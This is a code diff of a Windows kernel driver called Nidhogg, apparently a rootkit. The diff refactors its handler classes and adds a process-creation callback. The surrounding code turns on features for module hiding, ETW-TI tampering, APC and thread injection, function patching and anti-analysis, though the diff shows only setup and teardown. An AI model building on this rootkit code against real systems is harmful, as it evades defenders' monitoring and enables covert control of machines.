@@ -10,6 +10,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	Features.ProcessProtection = false;
 	Features.ThreadProtection = false;
 	Features.RegistryFeatures = false;
+	Features.AutoModuleUnload = false;
 	Print(DRIVER_PREFIX "Driver is being reflectively loaded...\n");
 
 	UNICODE_STRING driverName = RTL_CONSTANT_STRING(DRIVER_NAME);
@@ -105,12 +106,20 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 			Features.ThreadProtection = false;
 		}
 
-		status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &NidhoggRegistryUtils->RegCookie, nullptr);
+		status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &NidhoggRegistryHandler->regCookie, nullptr);
 
 		if (!NT_SUCCESS(status)) {
 			Print(DRIVER_PREFIX "Failed to register registry callback: (0x%08X)\n", status);
 			status = STATUS_SUCCESS;
 			Features.RegistryFeatures = false;
+		}
+
+		status = PsSetCreateProcessNotifyRoutine(OnProcessCreationExit, FALSE);
+
+		if (!NT_SUCCESS(status)) {
+			Print(DRIVER_PREFIX "Failed to register process creation callback: (0x%08X)\n", status);
+			status = STATUS_SUCCESS;
+			Features.AutoModuleUnload = false;
 		}
 	}
 	else {
@@ -143,20 +152,26 @@ void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 	Print(DRIVER_PREFIX "Unloading...\n");
 
 	if (Features.RegistryFeatures) {
-		NTSTATUS status = CmUnRegisterCallback(NidhoggRegistryUtils->RegCookie);
+		NTSTATUS status = CmUnRegisterCallback(NidhoggRegistryHandler->regCookie);
 
 		if (!NT_SUCCESS(status)) {
 			Print(DRIVER_PREFIX "Failed to unregister registry callbacks: (0x%08X)\n", status);
 		}
 	}
 
-	ClearAll();
+	if (Features.AutoModuleUnload) {
+		NTSTATUS status = PsSetCreateProcessNotifyRoutine(OnProcessCreationExit, TRUE);
 
-	// To avoid BSOD.
+		if (!NT_SUCCESS(status)) {
+			Print(DRIVER_PREFIX "Failed to unregister process creation callback: (0x%08X)\n", status);
+		}
+	}
+
 	if (Features.ThreadProtection && Features.ProcessProtection && RegistrationHandle) {
 		ObUnRegisterCallbacks(RegistrationHandle);
 		RegistrationHandle = NULL;
 	}
+	ClearAll();
 
 	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
 	IoDeleteSymbolicLink(&symbolicLink);
@@ -177,9 +192,10 @@ void ExecuteInitialOperations() {
 	ScriptManager* scriptManager = nullptr;
 	ScriptInformation scriptInfo{};
 
-	if (InitialOperationsSize == 0 || !InitialOperations)
+	if constexpr (InitialOperationsSize == 0 || !InitialOperations)
 		return;
-
+#pragma warning(push)
+#pragma warning(disable : 4702)
 	scriptInfo.ScriptSize = InitialOperationsSize;
 	MemoryAllocator<PVOID> scriptAllocator(&scriptInfo.Script, scriptInfo.ScriptSize);
 	NTSTATUS status = scriptAllocator.CopyData((PVOID)InitialOperations, scriptInfo.ScriptSize);
@@ -204,24 +220,7 @@ void ExecuteInitialOperations() {
 		Print(DRIVER_PREFIX "Failed to execute initial operations (0x%08X)\n", status);
 	else
 		Print(DRIVER_PREFIX "Executed initial opeartions successfully.\n");
-}
-
-/*
-* Description:
-* NidhoggCreateClose is responsible for creating a success response for given IRP.
-*
-* Parameters:
-* @DeviceObject [PDEVICE_OBJECT] -- Not used.
-* @Irp			[PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
-*
-* Returns:
-* @status		[NTSTATUS]		 -- Always will be STATUS_SUCCESS.
-*/
-NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
-	Irp->IoStatus.Status = STATUS_SUCCESS;
-	Irp->IoStatus.Information = 0;
-	IoCompleteRequest(Irp, IO_NO_INCREMENT);
-	return STATUS_SUCCESS;
+#pragma warning(pop)
 }
 
 /*
@@ -235,12 +234,13 @@ NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
 * There is no return value.
 */
 void ClearAll() {
-	delete NidhoggProccessUtils;
-	delete NidhoggFileUtils;
-	delete NidhoggMemoryUtils;
-	delete NidhoggAntiAnalysis;
-	delete NidhoggRegistryUtils;
-	delete NidhoggNetworkUtils;
+	delete NidhoggProcessHandler;
+	delete NidhoggThreadHandler;
+	delete NidhoggFileHandler;
+	delete NidhoggMemoryHandler;
+	delete NidhoggAntiAnalysisHandler;
+	delete NidhoggRegistryHandler;
+	delete NidhoggNetworkHandler;
 }
 
 /*
@@ -270,59 +270,66 @@ bool InitializeFeatures() {
 	AllocatePool2 = MmGetSystemRoutineAddress(&routineName);
 
 	// Initialize utils.
-	NidhoggProccessUtils = new ProcessUtils();
+	NidhoggProcessHandler = new ProcessHandler();
 
-	if (!NidhoggProccessUtils)
+	if (!NidhoggProcessHandler)
 		return false;
 
-	NidhoggFileUtils = new FileUtils();
+	NidhoggThreadHandler = new ThreadHandler();
 
-	if (!NidhoggFileUtils)
+	if (!NidhoggThreadHandler)
 		return false;
 
-	NidhoggMemoryUtils = new MemoryUtils();
+	NidhoggFileHandler = new FileHandler();
 
-	if (!NidhoggMemoryUtils)
+	if (!NidhoggFileHandler)
 		return false;
 
-	NidhoggAntiAnalysis = new AntiAnalysis();
+	NidhoggMemoryHandler = new MemoryHandler();
 
-	if (!NidhoggAntiAnalysis)
+	if (!NidhoggMemoryHandler)
 		return false;
 
-	NidhoggRegistryUtils = new RegistryUtils();
+	NidhoggAntiAnalysisHandler = new AntiAnalysisHandler();
 
-	if (!NidhoggRegistryUtils)
+	if (!NidhoggAntiAnalysisHandler)
 		return false;
 
-	NidhoggNetworkUtils = new NetworkUtils();
+	NidhoggRegistryHandler = new RegistryHandler();
 
-	if (!NidhoggNetworkUtils)
+	if (!NidhoggRegistryHandler)
+		return false;
+
+	NidhoggNetworkHandler = new NetworkHandler();
+
+	if (!NidhoggNetworkHandler)
 		return false;
 
 	// Initialize functions.
-	if (!(PULONG)MmCopyVirtualMemory)
+	if (!reinterpret_cast<PULONG>(MmCopyVirtualMemory))
 		Features.ReadData = false;
 
-	if (!(PULONG)ZwProtectVirtualMemory || !Features.ReadData)
+	if (!reinterpret_cast<PULONG>(ZwProtectVirtualMemory) || !Features.ReadData)
 		Features.WriteData = false;
 
-	if (!Features.WriteData || !(PULONG)PsGetProcessPeb)
+	if (!Features.WriteData || !reinterpret_cast<PULONG>(PsGetProcessPeb))
 		Features.FunctionPatching = false;
 
-	if (!(PULONG)PsGetProcessPeb || !(PULONG)PsLoadedModuleList || !&PsLoadedModuleResource)
+	if (!reinterpret_cast<PULONG>(PsGetProcessPeb) || !reinterpret_cast<PULONG>(PsLoadedModuleList) || 
+		!&PsLoadedModuleResource)
 		Features.ModuleHiding = false;
 
-	if (!(PULONG)ObReferenceObjectByName)
+	if (!reinterpret_cast<PULONG>(ObReferenceObjectByName))
 		Features.FileProtection = false;
 
-	if (!(PULONG)KeInsertQueueApc)
+	if (!reinterpret_cast<PULONG>(KeInsertQueueApc))
 		Features.EtwTiTamper = false;
 
-	if (!(PULONG)KeInitializeApc || !(PULONG)KeInsertQueueApc || !(PULONG)KeTestAlertThread || !(PULONG)ZwQuerySystemInformation)
+	if (!reinterpret_cast<PULONG>(KeInitializeApc) || !reinterpret_cast<PULONG>(KeInsertQueueApc) || 
+		!reinterpret_cast<PULONG>(KeTestAlertThread) || !reinterpret_cast<PULONG>(ZwQuerySystemInformation))
 		Features.ApcInjection = false;
 
-	if (NidhoggMemoryUtils->FoundNtCreateThreadEx())
+	if (NidhoggMemoryHandler->FoundNtCreateThreadEx())
 		Features.CreateThreadInjection = true;
 	return true;
 }
